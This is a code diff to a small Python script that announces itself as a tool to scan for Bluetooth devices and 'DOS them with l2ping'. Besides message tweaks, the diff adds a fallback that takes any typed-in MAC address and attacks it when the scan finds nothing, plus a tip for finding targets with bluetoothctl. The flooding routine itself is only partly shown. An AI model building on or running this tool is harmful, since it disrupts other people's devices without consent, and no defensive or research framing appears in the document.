@@ -3,7 +3,7 @@ import subprocess
 
 def scan_devices():
     try:
-        print("Scanning...wait.")
+        print("Scanning...please wait.")
         output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
         lines = output.splitlines()
         devices = {}
@@ -25,7 +25,8 @@ def print_device_info(devices):
             print(f"| {idx}  |   {mac}  |   {name}")
         print("---------------------------------------")
     else:
-        print("No devices found idk maybe try again.")
+        print("No devices found.")
+        return None
 
 def perform_dos(target_mac):
     print(f"Performing DoS attack on device with MAC address: {target_mac}")
@@ -40,8 +41,9 @@ def main():
     print("This is a simple Python script to scan for Bluetooth devices and DOS them with l2ping tool.")
     print("Made by noobmadman")
     print("https://github.com/noobmadman")
+    print("if you don't find any device with hcitool scan you can use bluetoothctl and then write scan on")
     
-    accept = input("Do you want to do this? (y/n): ").lower()
+    accept = input("Do you want to continue? (y/n): ").lower()
     if accept != "y":
         print("Exiting...")
         return
@@ -57,13 +59,10 @@ def main():
             perform_dos(target)
         else:
             print("Device not found in the list.")
-            retry = input("Do you want to try again? (y/n): ").lower()
-            if retry == "y":
-                main()
-            else:
-                print("Exiting...")
     else:
-        print("No devices found idk maybe try again.")
+        print("No devices found.")
+        target_mac = input("Enter the MAC address of the target device: ")
+        perform_dos(target_mac)
 
 if __name__ == "__main__":
     main()
